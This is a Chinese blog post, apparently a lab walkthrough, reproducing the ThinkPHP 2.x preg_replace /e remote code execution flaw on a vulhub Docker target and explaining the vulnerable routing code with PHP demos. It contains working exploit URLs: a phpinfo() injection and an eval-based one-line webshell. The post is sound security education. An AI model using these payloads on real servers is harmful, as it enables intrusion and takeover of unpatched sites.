@@ -1,0 +1,862 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="thinkphp2.x任意代码执行漏洞12漏洞条件：thinkphp2.x&amp;&amp;php版文为5.6.29以下漏洞利用目标函数：preg_replace &#x2F;e  漏洞实验环境 12靶机：kali虚拟机攻击机：Windows11  为了方便，这里用的是vulhub靶场vulhub官网vulhub靶场下载vulhub介绍vulhub是一个开源漏洞靶场，可以在安装docker和docker-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp漏洞复现">
+<meta property="og:url" content="http://example.com/2024/05/15/thinkphp/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="thinkphp2.x任意代码执行漏洞12漏洞条件：thinkphp2.x&amp;&amp;php版文为5.6.29以下漏洞利用目标函数：preg_replace &#x2F;e  漏洞实验环境 12靶机：kali虚拟机攻击机：Windows11  为了方便，这里用的是vulhub靶场vulhub官网vulhub靶场下载vulhub介绍vulhub是一个开源漏洞靶场，可以在安装docker和docker-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/1AE18759C0E3480b82783C824F21DD2D.png">
+<meta property="og:image" content="http://example.com/images/6DF7AF09B9FE45dbB706AFCF528090D5.png">
+<meta property="og:image" content="http://example.com/images/CCA89801853244178DA5B9BEE474DD00.png">
+<meta property="og:image" content="http://example.com/images/CBC80E619E724b6aAB7D354404F2AC46.png">
+<meta property="og:image" content="http://example.com/images/50EA6F5B71BE436e995933EE5F6D28AC.png">
+<meta property="og:image" content="http://example.com/images/8172B82F7F184c719B6B9EE4E9A25558.png">
+<meta property="og:image" content="http://example.com/images/5D10119D0411427dB88FB52EF3B5A5FB.png">
+<meta property="og:image" content="http://example.com/images/2E7359ACC8244ef8A1FF7CF064AE9018.png">
+<meta property="og:image" content="http://example.com/images/401BE30CF31F4da9B89FB32E6D49D35B.png">
+<meta property="og:image" content="http://example.com/images/FDF508F8A59943e2B203CF87EC109E0F.png">
+<meta property="og:image" content="http://example.com/images/5EEDB062A1F942ebBB64778A19E9BEA2.png">
+<meta property="og:image" content="http://example.com/images/5895F17F676548a28D30515273F6D4D5.png">
+<meta property="og:image" content="http://example.com/images/6929E780040B42d89CB1F55FF0E135B8.png">
+<meta property="og:image" content="http://example.com/images/58355A0E04654a80A33F8DE32C9A3437.png">
+<meta property="og:image" content="http://example.com/images/BD6927288D8C4fa985D5ABFC3229D7BB.png">
+<meta property="og:image" content="http://example.com/images/6510C7B6CEFA46eAA950135EF7C04DB.png">
+<meta property="og:image" content="http://example.com/images/3F247E4AB808408d8EF6DA7511B02769.png">
+<meta property="og:image" content="http://example.com/images/B49DDE1BF8F648828F9338EB29EFBCB9.png">
+<meta property="og:image" content="http://example.com/images/2DAE9E902FC44d6294D7DF373783A4C2.png">
+<meta property="og:image" content="http://example.com/images/9DE353380D2044f7B721BE70B2D6E.png">
+<meta property="og:image" content="http://example.com/images/A729948C19DD4d29AF788548BB99D2D4.png">
+<meta property="og:image" content="http://example.com/images/64DFC5CB0522410dB92AEA3151B96CB0.png">
+<meta property="og:image" content="http://example.com/images/2A3799100CDD4f70B159D5BA2C439C05.png">
+<meta property="og:image" content="http://example.com/images/242F5749F46949948B1436E1C912DDC4.png">
+<meta property="og:image" content="http://example.com/images/FB85CA4DF8F746d989D6E411DC056EC4.png">
+<meta property="og:image" content="http://example.com/images/FAA6DB989BB543769B289D2CB638FCCE.png">
+<meta property="og:image" content="http://example.com/images/2FE400ED65694c8281332E98CCD5B59C.png">
+<meta property="og:image" content="http://example.com/images/1B84B4231D6E4475B56C6DAD1BA21FAF.png">
+<meta property="og:image" content="http://example.com/images/34BD12D1BBC04c9d9DC18D673811ACF6.png">
+<meta property="og:image" content="http://example.com/images/218B3B6BA8624c67A8CD7D7648D7FFBD.png">
+<meta property="article:published_time" content="2024-05-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T08:10:12.279Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/1AE18759C0E3480b82783C824F21DD2D.png">
+  
+  
+  
+  <title>thinkphp漏洞复现 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="thinkphp漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-15 00:00" pubdate>
+          2024年5月15日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          83 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">thinkphp漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="thinkphp2-x任意代码执行漏洞"><a href="#thinkphp2-x任意代码执行漏洞" class="headerlink" title="thinkphp2.x任意代码执行漏洞"></a>thinkphp2.x任意代码执行漏洞</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">漏洞条件：thinkphp2.x<span class="hljs-meta">&amp;&amp;php版文为5.6.29以下</span><br>漏洞利用目标函数：preg_replace /e<br></code></pre></td></tr></table></figure>
+
+<p>漏洞实验环境</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">靶机：kali虚拟机<br>攻击机：Wi<span class="hljs-symbol">ndows11</span><br></code></pre></td></tr></table></figure>
+
+<p>为了方便，这里用的是vulhub靶场<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/thinkphp/2-rce/">vulhub官网</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub靶场下载</a><br><strong>vulhub介绍</strong><br>vulhub是一个开源漏洞靶场，可以在安装docker和docker-compose后，使用简单的指令搭建漏洞环境，具体介绍可以看官网。可以安装在windows、linux上</p>
+<p>开启vulhub靶场–打开docker</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd vulhub-master<span class="hljs-regexp">/thinkphp/</span><span class="hljs-number">2</span>-rce<br>docker-compose up -d<br></code></pre></td></tr></table></figure>
+<p><img src="/images/1AE18759C0E3480b82783C824F21DD2D.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过docker ps查看开启的8080端口<br><img src="/images/6DF7AF09B9FE45dbB706AFCF528090D5.png" srcset="/img/loading.gif" lazyload><br>通过命令ifconfig查看虚拟机的ip来准备侵入<br><img src="/images/CCA89801853244178DA5B9BEE474DD00.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入错误的url地址报错显示thinkPHP版本信息为2.1<br><img src="/images/CBC80E619E724b6aAB7D354404F2AC46.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过浏览器插件Wappalyzer可以看到php版本为5.5.38，小于5.6.29版本，满足条件<br><img src="/images/50EA6F5B71BE436e995933EE5F6D28AC.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞利用方式："><a href="#漏洞利用方式：" class="headerlink" title="漏洞利用方式："></a>漏洞利用方式：</h3><p>查看phpinfo()</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span><span class="hljs-regexp">/index.php?s=/</span>a<span class="hljs-regexp">/b/</span>c/<span class="hljs-variable">$&#123;phpinfo()&#125;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/8172B82F7F184c719B6B9EE4E9A25558.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造一句话木马</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.190.131:8080/index.php?s=/a/b/c/$&#123;print(eval($_POST</span>[<span class="hljs-string">a</span>]))&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/images/5D10119D0411427dB88FB52EF3B5A5FB.png" srcset="/img/loading.gif" lazyload><br>也可以使用蚁剑链接<br>这就是漏洞的利用方式</p>
+<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>漏洞存在的文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/ThinkPHP/</span>Lib<span class="hljs-regexp">/Think/U</span>til/Dispatcher.<span class="hljs-keyword">class</span>.php<br></code></pre></td></tr></table></figure>
+<p><img src="/images/2E7359ACC8244ef8A1FF7CF064AE9018.png" srcset="/img/loading.gif" lazyload></p>
+<p>参考文章<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1/353955">https://www.kancloud.cn/manual/thinkphp5_1&#x2F;353955</a>得到：url访问规则</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ThinkPHP5.<span class="hljs-number">1</span>在没有定义路由的情况下典型的URL访问规则是：<br>http:<span class="hljs-regexp">//</span>serverName<span class="hljs-regexp">/index.php(或者其它应用入口文件)/</span>模块控制器<span class="hljs-regexp">/操作/</span>[参数名/参数值...]<br><br><br>如果不支持PATHINFO的服务器可以使用兼容模式访问如下：<br>http:<span class="hljs-regexp">//</span>serverName<span class="hljs-regexp">/index.php(或者其它应用入口文件) ?s=/</span>模块<span class="hljs-regexp">/控制器/</span>操作<span class="hljs-regexp">/[参数名/参数值...]</span><br></code></pre></td></tr></table></figure>
+
+<p>关键漏洞代码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$depr</span> = C(<span class="hljs-string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);<br>        <span class="hljs-regexp">//</span> 分析PATHINFO信息<br>        self::getPathInfo();<br><br>        <span class="hljs-keyword">if</span>(!self::routerCheck())&#123;   <span class="hljs-regexp">//</span> 检测路由规则 如果没有则按默认规则调度URL<br>            <span class="hljs-variable">$paths</span> = explode(<span class="hljs-variable">$depr</span>,trim(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>],<span class="hljs-string">&#x27;/&#x27;</span>));<br>            <span class="hljs-variable">$var</span>  =  array();<br>            <span class="hljs-keyword">if</span> (C(<span class="hljs-string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !isset(<span class="hljs-variable">$_GET</span>[C(<span class="hljs-string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;<br>                <span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="hljs-variable">$paths</span>[<span class="hljs-number">0</span>]),explode(<span class="hljs-string">&#x27;,&#x27;</span>,strtolower(C(<span class="hljs-string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="hljs-variable">$paths</span>) : <span class="hljs-string">&#x27;&#x27;</span>;<br>                <span class="hljs-keyword">if</span>(C(<span class="hljs-string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class="hljs-string">&#x27;,&#x27;</span>,strtolower(C(<span class="hljs-string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;<br>                    <span class="hljs-regexp">//</span> 禁止直接访问分组<br>                    <span class="hljs-keyword">exit</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[C(<span class="hljs-string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="hljs-regexp">//</span> 还没有定义模块名称<br>                <span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="hljs-variable">$paths</span>);<br>            &#125;<br>            <span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="hljs-variable">$paths</span>);<br>            <span class="hljs-regexp">//</span> 解析剩余的URL参数<br>            <span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br>            <span class="hljs-variable">$_GET</span>   =  array_merge(<span class="hljs-variable">$var</span>,<span class="hljs-variable">$_GET</span>);<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>利用preg_replace的&#x2F;e模式匹配路由</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br>preg_replace(<span class="hljs-string">&#x27;正则规则&#x27;</span>,<span class="hljs-string">&#x27;替换字符&#x27;</span>,<span class="hljs-string">&#x27;目标字符&#x27;</span>)<br><span class="hljs-regexp">//</span>正则表达式：<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span><br><span class="hljs-regexp">//</span>替换字符：<span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span><br><span class="hljs-regexp">//</span>目标字符： implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>)<br><span class="hljs-regexp">//</span>这个函数<span class="hljs-number">5.2</span>~<span class="hljs-number">5.6</span>都可以执行，但是到了版本<span class="hljs-number">7</span>以上，就已经不支持/e修饰符了<br></code></pre></td></tr></table></figure>
+
+<p>先看到$var[&#39;\1&#39;]&#x3D;”\2”;,而$var是一个array<br>结合代码理解一下<br><strong>代码一:</strong> 注意看当前的变量a值为字符串，且该字符串本脚本没有相同的函数名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This func is run  <span class="hljs-subst">$str</span> .&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;GoodGoodStudy&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;[bbbaaahelloworldaaabbb]&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/aaa(.+?)aaa/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br>运行结果：<br>[bbbGoodGoodStudybbb]<br></code></pre></td></tr></table></figure>
+
+<p><strong>代码二：</strong>注意看当前的变量a值为test()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This func is run  <span class="hljs-subst">$str</span> .&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test()&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;[bbbaaahelloworldaaabbb]&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/aaa(.+?)aaa/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br>运行结果：<br>This func is run   .[bbbbbb]<br></code></pre></td></tr></table></figure>
+<p>可以发现执行了test()这个函数,但是并没有传递参数进去</p>
+<p><strong>代码三：</strong>注意看当前的变量a值为test(“\1”)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This func is run  <span class="hljs-subst">$str</span> .&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test(&quot;\1&quot;)&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;[bbbaaahelloworldaaabbb]&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/aaa(.+?)aaa/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br>运行结果：<br>This func is run  helloworld .[bbbbbb]<br></code></pre></td></tr></table></figure>
+<p>可以发现执行了test()这个函数，我们表面传递的参数是”\1”,结果表面参数确实传递进去了，但是本例传进去的是helloworld，helloworld是经过preg_replace()函数匹配要替换掉的原本那部分，现在转而成了参数进行传递了。<br>那我们假设现在$b的值是可控的，用户可以传参控制。</p>
+<p><strong>代码四：</strong>控制$b传递一个已知变量$c</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This func is run  <span class="hljs-subst">$str</span> .&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;test(&quot;\1&quot;)&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;aaa$caaa&#x27;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;CXK&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/aaa(.+?)aaa/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br>运行结果：<br>This func is run  CXK .<br></code></pre></td></tr></table></figure>
+<p>基于这个结果，在php当中，${}是可以构造一个变量的，{}写的是一般的字符，那么就会被当成变量，比如${a}等价于$a,那如果{}写的是一个已知函数名称呢？那么这个函数就会被执行，具体例子我们可以参考如下这个例子。</p>
+<p><strong>代码五：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpversion</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;CXK&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;aaaaa<span class="hljs-subst">&#123;$&#123;a&#125;</span>&#125;aaaaaa&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;aaaaa$&#123;phpversion()&#125;aaaaaa&quot;</span>;<br><br>运行结果：<br><span class="hljs-number">5.6</span>.<span class="hljs-number">19</span><br>aaaaaCXKaaaaaa<br>Notice:  Undefined variable: <span class="hljs-number">5.6</span>.<span class="hljs-number">19</span> in &lt;b&gt;[...][...] on line <span class="hljs-number">11</span><br>aaaaaaaaaaa<br></code></pre></td></tr></table></figure>
